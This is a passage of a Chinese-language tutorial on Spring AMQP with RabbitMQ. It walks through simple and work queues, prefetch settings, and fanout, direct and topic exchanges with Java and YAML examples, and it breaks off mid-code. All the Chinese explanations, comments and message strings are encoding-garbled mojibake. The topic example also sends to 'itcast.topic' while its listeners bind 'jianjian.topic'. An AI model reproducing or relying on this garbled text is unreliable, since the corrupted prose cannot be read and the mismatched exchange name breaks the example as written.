å°è£…çš„ä¸€å¥—APIè§„èŒƒï¼Œæä¾›äº†æ¨¡æ¿æ¥å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚åŒ…å«ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­spring- amqpæ˜¯åŸºç¡€æŠ½è±¡ï¼Œspring-rabbitæ˜¯åº•å±‚çš„é»˜è®¤å®ç°ã€‚å¹¶ä¸”è¿˜åˆ©ç”¨SpringBootå¯¹å…¶å®ç°äº†è‡ªåŠ¨è£…é…ï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚SpringAMQPçš„å®˜æ–¹åœ°å€ï¼šhttps://spring.io/projects/spring-amqp\n\nSpringAMQPæä¾›äº†ä¸‰ä¸ªåŠŸèƒ½ï¼š\n\n- è‡ªåŠ¨å£°æ˜é˜Ÿåˆ—ã€äº¤æ¢æœºåŠå…¶ç»‘å®šå…³ç³»\n- åŸºäºæ³¨è§£çš„ç›‘å¬å™¨æ¨¡å¼ï¼Œå¼‚æ­¥æ¥æ”¶æ¶ˆæ¯\n- å°è£…äº†RabbitTemplateå·¥å…·ï¼Œç”¨äºå‘é€æ¶ˆæ¯ \n\n### â‹Basic Queue\n\n![](https://img.jwt1399.top/img/202210051435751.png)\n\n#### â“µå‡†å¤‡å·¥ä½œ\n\nåœ¨çˆ¶å·¥ç¨‹mq-demoä¸­å¼•å…¥ä¾èµ–\n\n```xml\n<!--AMQPä¾èµ–ï¼ŒåŒ…å«RabbitMQ-->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n```\n\n#### â“¶æ¶ˆæ¯å‘é€\n\né¦–å…ˆé…ç½®MQåœ°å€ï¼Œåœ¨publisheræœåŠ¡çš„application.ymlä¸­æ·»åŠ é…ç½®ï¼š\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # ä¸»æœºå\n    port: 5672 # ç«¯å£\n    virtual-host: / # è™šæ‹Ÿä¸»æœº\n    username: jianjian # ç”¨æˆ·å\n    password: 123321 # å¯†ç \n```\n\nç„¶ååœ¨publisheræœåŠ¡ä¸­ç¼–å†™æµ‹è¯•ç±»SpringAmqpTestï¼Œå¹¶åˆ©ç”¨RabbitTemplateå®ç°æ¶ˆæ¯å‘é€ï¼š\n\n```java\n@SpringBootTest\npublic class SpringAmqpTest {\n\n    @Autowired\n    private RabbitTemplate rabbitTemplate;\n\n    @Test\n    public void testSimpleQueue() {\n        // é˜Ÿåˆ—åç§°\n        String queueName = \"simple.queue\";\n        // æ¶ˆæ¯\n        String message = \"hello, spring amqp!\";\n        // å‘é€æ¶ˆæ¯\n        rabbitTemplate.convertAndSend(queueName, message);\n    }\n}\n```\n\n#### â“·æ¶ˆæ¯æ¥æ”¶\n\né¦–å…ˆé…ç½®MQåœ°å€ï¼Œåœ¨consumeræœåŠ¡çš„application.ymlä¸­æ·»åŠ é…ç½®ï¼š\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # ä¸»æœºå\n    port: 5672 # ç«¯å£\n    virtual-host: / # è™šæ‹Ÿä¸»æœº\n    username: jianjian # ç”¨æˆ·å\n    password: 123321 # å¯†ç \n```\n\nç„¶ååœ¨consumeræœåŠ¡çš„`cn.jianjian.mq.listener`åŒ…ä¸­æ–°å»ºä¸€ä¸ªç±»SpringRabbitListenerï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```java\n@Component\npublic class SpringRabbitListener {\n\n    @RabbitListener(queues = \"simple.queue\")\n    public void listenSimpleQueueMessage(String msg) throws InterruptedException {\n        System.out.println(\"spring æ¶ˆè´¹è€…æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n    }\n}\n```\n\n#### â“¸æµ‹è¯•\n\nå¯åŠ¨consumeræœåŠ¡ï¼Œç„¶ååœ¨publisheræœåŠ¡ä¸­è¿è¡Œæµ‹è¯•ä»£ç ï¼Œå‘é€MQæ¶ˆæ¯\n\n### âŒWorkQueue\n\nWork queues ä¹Ÿè¢«ç§°ä¸º Task queuesã€‚ç®€å•æ¥è¯´å°±æ˜¯**è®©å¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå…±åŒæ¶ˆè´¹é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯**ã€‚\n\n![](https://img.jwt1399.top/img/202210061946056.png)\n\nå½“æ¶ˆæ¯å¤„ç†æ¯”è¾ƒè€—æ—¶çš„æ—¶å€™ï¼Œåˆ™ç”Ÿäº§æ¶ˆæ¯çš„é€Ÿåº¦ä¼šè¿œè¿œå¤§äºæ¶ˆæ¯çš„æ¶ˆè´¹é€Ÿåº¦ã€‚é•¿æ­¤ä»¥å¾€ï¼Œæ¶ˆæ¯å°±ä¼šå †ç§¯è¶Šæ¥è¶Šå¤šï¼Œæ— æ³•åŠæ—¶å¤„ç†ã€‚æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨ work æ¨¡å‹ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±åŒå¤„ç†æ¶ˆæ¯å¤„ç†ï¼Œé€Ÿåº¦å°±èƒ½å¤§å¤§æé«˜äº†ã€‚\n\n#### â“µæ¶ˆæ¯å‘é€\n\nè¿™æ¬¡æˆ‘ä»¬å¾ªç¯å‘é€ï¼Œæ¨¡æ‹Ÿå¤§é‡æ¶ˆæ¯å †ç§¯ç°è±¡ã€‚åœ¨publisheræœåŠ¡ä¸­çš„SpringAmqpTestç±»ä¸­æ·»åŠ ä¸€ä¸ªæµ‹è¯•æ–¹æ³•ï¼š\n\n```java\n@Test\npublic void testWorkQueue() throws InterruptedException {\n    // é˜Ÿåˆ—åç§°\n    String queueName = \"simple.queue\";\n    // æ¶ˆæ¯\n    String message = \"hello, message_\";\n    for (int i = 0; i < 50; i++) {\n        // å‘é€æ¶ˆæ¯\n        rabbitTemplate.convertAndSend(queueName, message + i);\n        Thread.sleep(20);// é¿å…å‘é€å¤ªå¿«\u000b\n    }\n}\n```\n\n#### â“¶æ¶ˆæ¯æ¥æ”¶\n\nè¦æ¨¡æ‹Ÿå¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåŒä¸€ä¸ªé˜Ÿåˆ—ï¼Œæˆ‘ä»¬åœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ 2ä¸ªæ–°çš„æ–¹æ³•ï¼š\n\n```java\n@RabbitListener(queues = \"simple.queue\")\npublic void listenWorkQueue1(String msg) throws InterruptedException {\n    System.out.println(\"æ¶ˆè´¹è€…1æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\" + LocalTime.now());\n    Thread.sleep(20);//æ¨¡æ‹Ÿä»»åŠ¡è€—æ—¶\n}\n\n@RabbitListener(queues = \"simple.queue\")\npublic void listenWorkQueue2(String msg) throws InterruptedException {\n    System.err.println(\"æ¶ˆè´¹è€…2........æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\" + LocalTime.now());\n    Thread.sleep(200);\n}\n```\n\n#### â“·æµ‹è¯•\n\nå¯åŠ¨ConsumerApplicationåï¼Œå†æ‰§è¡ŒpublisheræœåŠ¡ä¸­åˆšåˆšç¼–å†™çš„æµ‹è¯•æ–¹æ³•testWorkQueueã€‚\n\nå¯ä»¥çœ‹åˆ°æ¶ˆè´¹è€…1å¾ˆå¿«å®Œæˆäº†è‡ªå·±çš„25æ¡æ¶ˆæ¯ã€‚æ¶ˆè´¹è€…2å´åœ¨ç¼“æ…¢çš„å¤„ç†è‡ªå·±çš„25æ¡æ¶ˆæ¯ã€‚\n\nä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æ˜¯å¹³å‡åˆ†é…ç»™æ¯ä¸ªæ¶ˆè´¹è€…ï¼Œå¹¶æ²¡æœ‰è€ƒè™‘åˆ°æ¶ˆè´¹è€…çš„å¤„ç†èƒ½åŠ›ã€‚è¿™æ ·æ˜¾ç„¶æ˜¯æœ‰é—®é¢˜çš„ã€‚\n\n#### â“¸æ¶ˆè´¹é¢„å–é™åˆ¶\n\né€šè¿‡é…ç½®å¯ä»¥è§£å†³ä¸Šè¿°é—®é¢˜ã€‚ä¿®æ”¹consumeræœåŠ¡çš„application.ymlæ–‡ä»¶ï¼Œè®¾ç½®preFetchå€¼ï¼Œå¯ä»¥æ§åˆ¶é¢„å–æ¶ˆæ¯çš„ä¸Šé™\n\n```yaml\nspring:\n  rabbitmq:\n    listener:\n      simple:\n        prefetch: 1 # æ¯æ¬¡åªèƒ½è·å–ä¸€æ¡æ¶ˆæ¯ï¼Œå¤„ç†å®Œæˆæ‰èƒ½è·å–ä¸‹ä¸€ä¸ªæ¶ˆæ¯\n```\n\n#### â“¹æ€»ç»“\n\n- å¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼ŒåŒä¸€æ¡æ¶ˆæ¯åªä¼šè¢«ä¸€ä¸ªæ¶ˆè´¹è€…å¤„ç†\n- é€šè¿‡è®¾ç½®prefetchæ¥æ§åˆ¶æ¶ˆè´¹è€…é¢„å–çš„æ¶ˆæ¯æ•°é‡\n\n### âPublish/Subscribe\n\nå‘å¸ƒè®¢é˜…æ¨¡å¼çš„åŒºåˆ«å°±æ˜¯å…è®¸å°†åŒä¸€æ¶ˆæ¯å‘é€ç»™å¤šä¸ªæ¶ˆè´¹è€…ã€‚å®ç°æ–¹å¼æ˜¯åŠ å…¥äº†exchangeï¼ˆäº¤æ¢æœºï¼‰ã€‚\n\n![å‘å¸ƒè®¢é˜…æ¨¡å‹](https://img.jwt1399.top/img/202210062001172.png)\n\n\n\n- Publisherï¼šç”Ÿäº§è€…ï¼Œä¹Ÿå°±æ˜¯è¦å‘é€æ¶ˆæ¯çš„ç¨‹åºï¼Œä½†æ˜¯ä¸å†å‘é€åˆ°é˜Ÿåˆ—ä¸­ï¼Œè€Œæ˜¯å‘ç»™äº¤æ¢æœº\n- Consumerï¼šæ¶ˆè´¹è€…ï¼Œä¸ä»¥å‰ä¸€æ ·ï¼Œè®¢é˜…é˜Ÿåˆ—ï¼Œæ²¡æœ‰å˜åŒ–\n- Queueï¼šæ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿä¸ä»¥å‰ä¸€æ ·ï¼Œæ¥æ”¶æ¶ˆæ¯ã€ç¼“å­˜æ¶ˆæ¯ã€‚\n- Exchangeï¼šäº¤æ¢æœºï¼Œä¸€æ–¹é¢ï¼Œæ¥æ”¶ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ã€‚å¦ä¸€æ–¹é¢ï¼ŒçŸ¥é“å¦‚ä½•å¤„ç†æ¶ˆæ¯ï¼Œä¾‹å¦‚é€’äº¤ç»™æŸä¸ªç‰¹åˆ«é˜Ÿåˆ—ã€é€’äº¤ç»™æ‰€æœ‰é˜Ÿåˆ—ã€æˆ–æ˜¯å°†æ¶ˆæ¯ä¸¢å¼ƒã€‚åˆ°åº•å¦‚ä½•æ“ä½œï¼Œå–å†³äºExchangeçš„ç±»å‹ã€‚Exchangeæœ‰ä»¥ä¸‹3ç§ç±»å‹ï¼š\n  - Fanoutï¼šå¹¿æ’­ï¼Œå°†æ¶ˆæ¯äº¤ç»™æ‰€æœ‰ç»‘å®šåˆ°äº¤æ¢æœºçš„é˜Ÿåˆ—\n  - Directï¼šå®šå‘ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆæŒ‡å®šrouting key çš„é˜Ÿåˆ—\n  - Topicï¼šé€šé…ç¬¦ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆrouting patternï¼ˆè·¯ç”±æ¨¡å¼ï¼‰ çš„é˜Ÿåˆ—\n\n**Exchangeï¼ˆäº¤æ¢æœºï¼‰åªè´Ÿè´£è½¬å‘æ¶ˆæ¯ï¼Œä¸å…·å¤‡å­˜å‚¨æ¶ˆæ¯çš„èƒ½åŠ›**ï¼Œå› æ­¤å¦‚æœæ²¡æœ‰ä»»ä½•é˜Ÿåˆ—ä¸Exchangeç»‘å®šï¼Œæˆ–è€…æ²¡æœ‰ç¬¦åˆè·¯ç”±è§„åˆ™çš„é˜Ÿåˆ—ï¼Œé‚£ä¹ˆæ¶ˆæ¯ä¼šä¸¢å¤±ï¼\n\n#### â€Fanout\n\n![](https://img.jwt1399.top/img/202210071521150.png)\n\nåœ¨å¹¿æ’­æ¨¡å¼ä¸‹ï¼Œæ¶ˆæ¯å‘é€æµç¨‹æ˜¯è¿™æ ·çš„ï¼š\n\n- 1ï¼‰  å¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—\n- 2ï¼‰  æ¯ä¸ªé˜Ÿåˆ—éƒ½è¦ç»‘å®šåˆ° exchangeï¼ˆäº¤æ¢æœºï¼‰\n- 3ï¼‰  ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ï¼Œåªèƒ½å‘é€åˆ°äº¤æ¢æœºï¼Œäº¤æ¢æœºæ¥å†³å®šè¦å‘ç»™å“ªä¸ªé˜Ÿåˆ—ï¼Œç”Ÿäº§è€…æ— æ³•å†³å®š\n- 4ï¼‰  äº¤æ¢æœºæŠŠæ¶ˆæ¯å‘é€ç»™ç»‘å®šè¿‡çš„æ‰€æœ‰é˜Ÿåˆ—\n- 5ï¼‰  è®¢é˜…é˜Ÿåˆ—çš„æ¶ˆè´¹è€…éƒ½èƒ½æ‹¿åˆ°æ¶ˆæ¯\n\n**æ¡ˆä¾‹**\n\n- åˆ›å»ºä¸€ä¸ªäº¤æ¢æœº jianjian.fanoutï¼Œç±»å‹æ˜¯ Fanout\n- åˆ›å»ºä¸¤ä¸ªé˜Ÿåˆ—fanout.queue1å’Œfanout.queue2ï¼Œç»‘å®šåˆ°äº¤æ¢æœº jianjian.fanout\n\n##### â€å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº\n\nSpringæä¾›äº†ä¸€ä¸ªæ¥å£Exchangeï¼Œæ¥è¡¨ç¤ºæ‰€æœ‰ä¸åŒç±»å‹çš„äº¤æ¢æœºï¼š\n\n![](https://img.jwt1399.top/img/202210071521480.png)\n\nåœ¨consumerä¸­åˆ›å»ºä¸€ä¸ªç±»ï¼Œå£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š\n\n```java\n@Configuration\npublic class FanoutConfig {\n    /**\n     * å£°æ˜äº¤æ¢æœº\n     * @return Fanoutç±»å‹äº¤æ¢æœº\n     */\n    @Bean\n    public FanoutExchange fanoutExchange(){\n        return new FanoutExchange(\"jianjian.fanout\");\n    }\n\n    /**\n     * ç¬¬1ä¸ªé˜Ÿåˆ—\n     */\n    @Bean\n    public Queue fanoutQueue1(){\n        return new Queue(\"fanout.queue1\");\n    }\n\n    /**\n     * ç»‘å®šé˜Ÿåˆ—å’Œäº¤æ¢æœº\n     */\n    @Bean\n    public Binding bindingQueue1(Queue fanoutQueue1, FanoutExchange fanoutExchange){\n        return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);\n    }\n\n    /**\n     * ç¬¬2ä¸ªé˜Ÿåˆ—\n     */\n    @Bean\n    public Queue fanoutQueue2(){\n        return new Queue(\"fanout.queue2\");\n    }\n\n    /**\n     * ç»‘å®šé˜Ÿåˆ—å’Œäº¤æ¢æœº\n     */\n    @Bean\n    public Binding bindingQueue2(Queue fanoutQueue2, FanoutExchange fanoutExchange){\n        return BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);\n    }\n}\n```\n\n##### âæ¶ˆæ¯å‘é€\n\nåœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š\n\n```java\n@Test\npublic void testFanoutExchange() {\n    // é˜Ÿåˆ—åç§°\n    String exchangeName = \"jianjian.fanout\";\n    // æ¶ˆæ¯\n    String message = \"hello, everyone!\";\n    rabbitTemplate.convertAndSend(exchangeName, \"\", message);\n}\n```\n\n##### â‚æ¶ˆæ¯æ¥æ”¶\n\nåœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ ä¸¤ä¸ªæ–¹æ³•ï¼Œä½œä¸ºæ¶ˆè´¹è€…ï¼š\n\n```java\n@RabbitListener(queues = \"fanout.queue1\")\npublic void listenFanoutQueue1(String msg) {\n    System.out.println(\"æ¶ˆè´¹è€…1æ¥æ”¶åˆ°Fanoutæ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n\n@RabbitListener(queues = \"fanout.queue2\")\npublic void listenFanoutQueue2(String msg) {\n    System.out.println(\"æ¶ˆè´¹è€…2æ¥æ”¶åˆ°Fanoutæ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n```\n\n##### âƒæ€»ç»“\n\näº¤æ¢æœºçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- æ¥æ”¶publisherå‘é€çš„æ¶ˆæ¯\n- å°†æ¶ˆæ¯æŒ‰ç…§è§„åˆ™è·¯ç”±åˆ°ä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—\n- ä¸èƒ½ç¼“å­˜æ¶ˆæ¯ï¼Œè·¯ç”±å¤±è´¥ï¼Œæ¶ˆæ¯ä¸¢å¤±\n- FanoutExchangeä¼šå°†æ¶ˆæ¯è·¯ç”±åˆ°æ¯ä¸ªç»‘å®šçš„é˜Ÿåˆ—\n\nå£°æ˜é˜Ÿåˆ—ã€äº¤æ¢æœºã€ç»‘å®šå…³ç³»çš„Beanæ˜¯ä»€ä¹ˆï¼Ÿ\n\n- Queue\n- FanoutExchange\n- Binding\n\n#### âDirect\n\nåœ¨`Fanout`æ¨¡å¼ä¸­ï¼Œä¸€æ¡æ¶ˆæ¯ï¼Œä¼šè¢«æ‰€æœ‰è®¢é˜…çš„é˜Ÿåˆ—éƒ½æ¶ˆè´¹ã€‚ä½†æ˜¯ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸åŒçš„æ¶ˆæ¯è¢«ä¸åŒçš„é˜Ÿåˆ—æ¶ˆè´¹ã€‚è¿™æ—¶å°±è¦ç”¨åˆ°`Direct`ç±»å‹çš„exchangeã€‚\n\n![](https://img.jwt1399.top/img/202210071530068.png)\n\n åœ¨Directæ¨¡å‹ä¸‹ï¼š\n\n- é˜Ÿåˆ—ä¸äº¤æ¢æœºçš„ç»‘å®šï¼Œä¸èƒ½æ˜¯ä»»æ„ç»‘å®šäº†ï¼Œè€Œæ˜¯è¦æŒ‡å®šä¸€ä¸ª`RoutingKey`ï¼ˆè·¯ç”±keyï¼‰\n- æ¶ˆæ¯çš„å‘é€æ–¹åœ¨å‘ exchangeå‘é€æ¶ˆæ¯æ—¶ï¼Œä¹Ÿå¿…é¡»æŒ‡å®šæ¶ˆæ¯çš„ `RoutingKey`ã€‚\n- exchangeä¸å†æŠŠæ¶ˆæ¯äº¤ç»™æ¯ä¸€ä¸ªç»‘å®šçš„é˜Ÿåˆ—ï¼Œè€Œæ˜¯æ ¹æ®æ¶ˆæ¯çš„`Routing Key`è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰é˜Ÿåˆ—çš„`Routingkey`ä¸æ¶ˆæ¯çš„ `Routing key`å®Œå…¨ä¸€è‡´ï¼Œæ‰ä¼šæ¥æ”¶åˆ°æ¶ˆæ¯\n\n**æ¡ˆä¾‹**\n\n1. åˆ©ç”¨@RabbitListenerå£°æ˜Exchangeã€Queueã€RoutingKey\n\n2. åœ¨consumeræœåŠ¡ä¸­ï¼Œç¼–å†™ä¸¤ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œåˆ†åˆ«ç›‘å¬direct.queue1å’Œdirect.queue2\n\n3. åœ¨publisherä¸­ç¼–å†™æµ‹è¯•æ–¹æ³•ï¼Œå‘jianjian. directå‘é€æ¶ˆæ¯\n\n##### â€åŸºäºæ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº\n\nåŸºäº@Beançš„æ–¹å¼å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºæ¯”è¾ƒéº»çƒ¦ï¼ŒSpringè¿˜æä¾›äº†åŸºäºæ³¨è§£æ–¹å¼æ¥å£°æ˜ã€‚\n\nåœ¨consumerçš„SpringRabbitListenerä¸­æ·»åŠ ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼ŒåŒæ—¶åŸºäºæ³¨è§£æ¥å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š\n\n```java\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"direct.queue1\"),\n    exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n    key = {\"red\", \"blue\"}\n))\npublic void listenDirectQueue1(String msg){\n    System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue1çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"direct.queue2\"),\n    exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n    key = {\"red\", \"yellow\"}\n))\npublic void listenDirectQueue2(String msg){\n    System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue2çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n```\n\n##### âæ¶ˆæ¯å‘é€\n\nåœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š\n\n```java\n@Test\npublic void testSendDirectExchange() {\n    // äº¤æ¢æœºåç§°\n    String exchangeName = \"jianjian.direct\";\n    // æ¶ˆæ¯\n    String message = \"çº¢è‰²è­¦æŠ¥ï¼æ—¥æœ¬ä¹±æ’æ ¸åºŸæ°´ï¼Œå¯¼è‡´æµ·æ´‹ç”Ÿç‰©å˜å¼‚ï¼ŒæƒŠç°å“¥æ–¯æ‹‰ï¼\";\n    // å‘é€æ¶ˆæ¯\n    rabbitTemplate.convertAndSend(exchangeName, \"red\", message);\n}\n```\n\n##### â‚æ€»ç»“\n\næè¿°ä¸‹Directäº¤æ¢æœºä¸Fanoutäº¤æ¢æœºçš„å·®å¼‚ï¼Ÿ\n\n- Fanoutäº¤æ¢æœºå°†æ¶ˆæ¯è·¯ç”±ç»™æ¯ä¸€ä¸ªä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—\n- Directäº¤æ¢æœºæ ¹æ®RoutingKeyåˆ¤æ–­è·¯ç”±ç»™å“ªä¸ªé˜Ÿåˆ—\n- å¦‚æœå¤šä¸ªé˜Ÿåˆ—å…·æœ‰ç›¸åŒçš„RoutingKeyï¼Œåˆ™ä¸FanoutåŠŸèƒ½ç±»ä¼¼\n\nåŸºäº@RabbitListeneræ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºæœ‰å“ªäº›å¸¸è§æ³¨è§£ï¼Ÿ\n\n- @Queue\n- @Exchange\n\n#### â‚Topic\n\n`Topic`ä¸`Direct`ç›¸æ¯”ï¼Œéƒ½æ˜¯å¯ä»¥æ ¹æ®`RoutingKey`æŠŠæ¶ˆæ¯è·¯ç”±åˆ°ä¸åŒçš„é˜Ÿåˆ—ã€‚åªä¸è¿‡`Topic`ç±»å‹`exchange`å¯ä»¥è®©é˜Ÿåˆ—åœ¨ç»‘å®š`Routing key` çš„æ—¶å€™ä½¿ç”¨é€šé…ç¬¦ï¼\n\n![](https://img.jwt1399.top/img/202210071539760.png)\n\n`Routingkey` ä¸€èˆ¬éƒ½æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå•è¯ç»„æˆï¼Œå¤šä¸ªå•è¯ä¹‹é—´ä»¥â€œ`.`â€åˆ†å‰²ï¼Œä¾‹å¦‚ï¼š `item.insert`\n\n é€šé…ç¬¦è§„åˆ™ï¼š\n\n- `#`ï¼šåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªè¯\n- `*`ï¼šåŒ¹é…ä¸å¤šä¸å°‘æ°å¥½1ä¸ªè¯\n\nä¸¾ä¾‹ï¼š\n\n`item.#`ï¼šèƒ½å¤ŸåŒ¹é…`item.spu.insert` æˆ–è€… `item.spu`\n\n`item.*`ï¼šåªèƒ½åŒ¹é…`item.spu`\n\nè§£é‡Šï¼š\n\n- Queue1ï¼šç»‘å®šçš„æ˜¯`china.#` ï¼Œå› æ­¤å‡¡æ˜¯ä»¥ `china.`å¼€å¤´çš„`routing key` éƒ½ä¼šè¢«åŒ¹é…åˆ°ã€‚åŒ…æ‹¬china.newså’Œchina.weather\n- Queue2ï¼šç»‘å®šçš„æ˜¯`#.news` ï¼Œå› æ­¤å‡¡æ˜¯ä»¥ `.news`ç»“å°¾çš„ `routing key` éƒ½ä¼šè¢«åŒ¹é…ã€‚åŒ…æ‹¬china.newså’Œjapan.news\n\n**æ¡ˆä¾‹**\n\n1. å¹¶åˆ©ç”¨@RabbitListenerå£°æ˜Exchangeã€Queueã€RoutingKey\n\n2. åœ¨consumeræœåŠ¡ä¸­ï¼Œç¼–å†™ä¸¤ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œåˆ†åˆ«ç›‘å¬topic.queue1å’Œtopic.queue2\n\n3. åœ¨publisherä¸­ç¼–å†™æµ‹è¯•æ–¹æ³•ï¼Œå‘jianjian. topicå‘é€æ¶ˆæ¯\n\n##### â€æ¶ˆæ¯å‘é€\n\nåœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š\n\n```java\n@Test\npublic void testSendTopicExchange() {\n    // äº¤æ¢æœºåç§°\n    String exchangeName = \"itcast.topic\";\n    // æ¶ˆæ¯\n    String message = \"å–œæŠ¥ï¼å­™æ‚Ÿç©ºå¤§æˆ˜å“¥æ–¯æ‹‰ï¼Œèƒœ!\";\n    // å‘é€æ¶ˆæ¯\n    rabbitTemplate.convertAndSend(exchangeName, \"china.news\", message);\n}\n```\n\n##### âæ¶ˆæ¯æ¥æ”¶\n\nåœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ æ–¹æ³•ï¼š\n\n```java\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"topic.queue1\"),\n    exchange = @Exchange(name = \"jianjian.topic\", type = ExchangeTypes.TOPIC),\n    key = \"china.#\"\n))\npublic void listenTopicQueue1(String msg){\n    System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°topic.queue1çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"topic.queue2\"),\n    exchange = @Exchange(name = \"jianjian.topic\", type = ExchangeTypes.TOPIC),\n    key = \"#.news\"\n))\npublic void listenTopicQueue2(String msg){\n    System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°topic.queue2çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n}\n```\n\n##### â‚æ€»ç»“\n\næè¿°ä¸‹Directäº¤æ¢æœºä¸Topicäº¤æ¢æœºçš„å·®å¼‚ï¼Ÿ\n\n- Topicäº¤æ¢æœºæ¥æ”¶çš„æ¶ˆæ¯RoutingKeyå¿…é¡»æ˜¯å¤šä¸ªå•è¯ï¼Œä»¥ `.` åˆ†å‰²\n- Topicäº¤æ¢æœºä¸é˜Ÿåˆ—ç»‘å®šæ—¶çš„bindingKeyå¯ä»¥æŒ‡å®šé€šé…ç¬¦\n  - `#`ï¼šä»£è¡¨0ä¸ªæˆ–å¤šä¸ªè¯\n  - `*`ï¼šä»£è¡¨1ä¸ªè¯\n\n\n### â‘æ¶ˆæ¯è½¬æ¢å™¨\n\nSpringä¼šæŠŠä½ å‘é€çš„æ¶ˆæ¯åºåˆ—åŒ–ä¸ºå­—èŠ‚å‘é€ç»™MQï¼Œæ¥æ”¶æ¶ˆæ¯çš„æ—¶å€™ï¼Œè¿˜ä¼šæŠŠå­—èŠ‚ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚\n\n![](https://img.jwt1399.top/img/202210082150457.png)\n\nåªä¸è¿‡ï¼Œé»˜è®¤æƒ…å†µä¸‹Springé‡‡ç”¨çš„åºåˆ—åŒ–æ–¹å¼æ˜¯JDKåºåˆ—åŒ–ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒJDKåºåˆ—åŒ–å­˜åœ¨ä¸‹åˆ—é—®é¢˜ï¼š\n\n- æ•°æ®ä½“ç§¯è¿‡å¤§\n- æœ‰å®‰å…¨æ¼æ´\n- å¯è¯»æ€§å·®\n\n#### â€æµ‹è¯•é»˜è®¤è½¬æ¢å™¨\n\næˆ‘ä»¬ä¿®æ”¹æ¶ˆæ¯å‘é€çš„ä»£ç ï¼Œå‘é€ä¸€ä¸ªMapå¯¹è±¡ï¼š\n\n```java\n@Test\npublic void testSendMap() throws InterruptedException {\n    // å‡†å¤‡æ¶ˆæ¯\n    Map<String,Object> msg = new HashMap<>();\n    msg.put(\"name\", \"Jack\");\n    msg.put(\"age\", 21);\n    // å‘é€æ¶ˆæ¯\n    rabbitTemplate.convertAndSend(\"simple.queue\",\"\", 